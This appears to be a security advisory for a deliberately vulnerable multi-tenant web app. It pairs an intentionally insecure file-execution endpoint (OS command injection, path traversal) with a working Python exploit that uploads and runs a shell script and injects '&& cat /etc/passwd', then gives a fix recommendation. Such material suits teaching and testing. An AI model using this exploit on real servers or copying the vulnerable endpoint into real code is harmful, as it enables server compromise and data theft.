# Vulnerability: Remote Code Execution via File Execution

## 1. Vulnerability Name
**CWE-78: OS Command Injection & CWE-22: Path Traversal**

## 2. Location in Code
- **File:** `backend/src/routes/fileExecution.js` (lines 8-40)

```javascript
// fileExecution.js - Direct file execution with command injection
router.post('/execute/:filename', auth, async (req, res) => {
    try {
        const { filename } = req.params;
        const { args = '' } = req.body;
        
        // VULNERABILITY: No path validation - directory traversal possible
        const filePath = path.join(__dirname, '..', 'uploads', filename);
        
        // VULNERABILITY: Execute any uploaded file
        if (fs.existsSync(filePath)) {
            // VULNERABILITY: Command injection via args
            const command = `${filePath} ${args}`;
            
            exec(command, (error, stdout, stderr) => {
                res.json({
                    success: !error,
                    command: command,
                    output: stdout,
                    error: stderr,
                    // VULNERABILITY: Expose system info
                    systemInfo: {
                        cwd: process.cwd(),
                        platform: process.platform,
                        user: process.env.USER || process.env.USERNAME
                    }
                });
            });
        }
    } catch (error) {
        res.status(500).json({ 
            error: error.message,
            stack: error.stack 
        });
    }
});
```

## 3. Technical Root Cause
The application provides a direct file execution endpoint that executes uploaded files without validation. Combined with unrestricted file upload, this allows attackers to upload and execute arbitrary code on the server. Command injection is possible through the args parameter.

## 4. Proof of Concept Explanation
1. Upload a malicious executable script through the file upload endpoint
2. Use the file execution endpoint to run the uploaded script
3. Inject additional commands through the args parameter
4. Achieve full remote code execution on the server

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import os

def exploit_remote_code_execution():
    base_url = "http://localhost:5000"
    
    # Login to get token
    login_data = {"email": "demo@tenantguard.com", "password": "demo123"}
    response = requests.post(f"{base_url}/api/auth/login", json=login_data)
    token = response.json().get('token')
    headers = {"Authorization": f"Bearer {token}"}
    
    print("[+] Testing Remote Code Execution...")
    
    # Create malicious script
    malicious_script = '''#!/bin/bash
echo "=== SYSTEM COMPROMISED ==="
whoami
pwd
uname -a
ls -la /etc/passwd
echo "=== END SYSTEM INFO ==="
'''
    
    script_path = "rce_exploit.sh"
    with open(script_path, 'w') as f:
        f.write(malicious_script)
    
    # Make script executable
    os.chmod(script_path, 0o755)
    
    # Upload malicious script
    with open(script_path, 'rb') as f:
        files = {'file': ('rce_exploit.sh', f, 'application/x-sh')}
        upload_response = requests.post(
            f"{base_url}/api/documents/upload",
            headers=headers,
            files=files
        )
    
    if upload_response.status_code == 201:
        print("[+] Malicious script uploaded successfully")
        
        # Execute the uploaded script
        exec_response = requests.post(
            f"{base_url}/api/files/execute/rce_exploit.sh",
            headers=headers,
            json={"args": ""}
        )
        
        if exec_response.status_code == 200:
            result = exec_response.json()
            print("[!] REMOTE CODE EXECUTION SUCCESSFUL")
            print(f"[+] Command executed: {result.get('command')}")
            print(f"[+] Output:\n{result.get('output')}")
            print(f"[+] System Info: {result.get('systemInfo')}")
        
        # Test command injection via args
        print("\n[+] Testing command injection via args...")
        injection_response = requests.post(
            f"{base_url}/api/files/execute/rce_exploit.sh",
            headers=headers,
            json={"args": "&& cat /etc/passwd && echo 'COMMAND INJECTION SUCCESS'"}
        )
        
        if injection_response.status_code == 200:
            result = injection_response.json()
            print("[!] COMMAND INJECTION SUCCESSFUL")
            print(f"[+] Injected command output:\n{result.get('output')}")
    
    # Cleanup
    if os.path.exists(script_path):
        os.remove(script_path)
    
    return True

if __name__ == "__main__":
    exploit_remote_code_execution()
```

## 6. Impact
- **Complete System Compromise:** Full control over the server
- **Data Exfiltration:** Access to all files and databases
- **Lateral Movement:** Use compromised server to attack internal network
- **Service Disruption:** Ability to crash or modify the application

**CVSS Score:** 10.0 (Critical)

## 7. Fix Recommendation

Remove the file execution endpoint entirely:

```javascript
// REMOVE THE ENTIRE FILE EXECUTION ENDPOINT
// This functionality is inherently dangerous and should not exist

// If file processing is needed, use secure alternatives:

// 1. Sandboxed execution environment
const { VM } = require('vm2');

// 2. Whitelist of allowed operations
const ALLOWED_OPERATIONS = ['convert', 'resize', 'compress'];

// 3. Secure file processing without execution
router.post('/process/:operation', auth, async (req, res) => {
    try {
        const { operation } = req.params;
        const { documentId } = req.body;
        
        if (!ALLOWED_OPERATIONS.includes(operation)) {
            return res.status(400).json({ error: 'Operation not allowed' });
        }
        
        const document = await Document.findOne({
            _id: documentId,
            userId: req.user._id,
            tenantId: req.user.tenantId
        });
        
        if (!document) {
            return res.status(404).json({ error: 'Document not found' });
        }
        
        // Process file using safe libraries (no execution)
        switch (operation) {
            case 'convert':
                // Use libraries like sharp for images, pdf-lib for PDFs
                break;
            case 'resize':
                // Use image processing libraries
                break;
            case 'compress':
                // Use compression libraries
                break;
        }
        
        res.json({ message: 'File processed successfully' });
    } catch (error) {
        res.status(500).json({ error: 'Processing failed' });
    }
});

// Never allow direct file execution
// Never use exec() or spawn() with user input
// Use containerization for any file processing needs
```